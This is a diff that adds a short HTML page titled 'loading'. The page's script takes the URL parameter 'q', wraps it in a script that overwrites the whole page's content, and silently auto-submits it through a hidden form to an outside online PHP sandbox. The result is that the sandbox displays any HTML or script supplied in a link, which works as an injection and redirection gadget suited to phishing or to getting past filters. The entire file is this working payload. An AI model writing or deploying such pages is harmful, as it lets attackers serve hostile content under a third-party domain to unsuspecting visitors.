@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset='utf-8'>
+        <title>loading</title>
+    </head>
+    <body>
+        <form action='https://phponlinesandbox.com/' method='POST' id='f' hidden>
+            <textarea id='t' name='code999'></textarea>
+            <input name='action1' value='RUN CODE' hidden>
+        </form>
+        <script>
+            let x=new URLSearchParams(window.location.search);
+            document.getElementById('t').value='<script>document.documentElement.innerHTML=`\n'+x.get('q')+'?>\n`;</'+'script>';
+            document.getElementById('f').submit();
+        </script>
+    </body>
+</html>
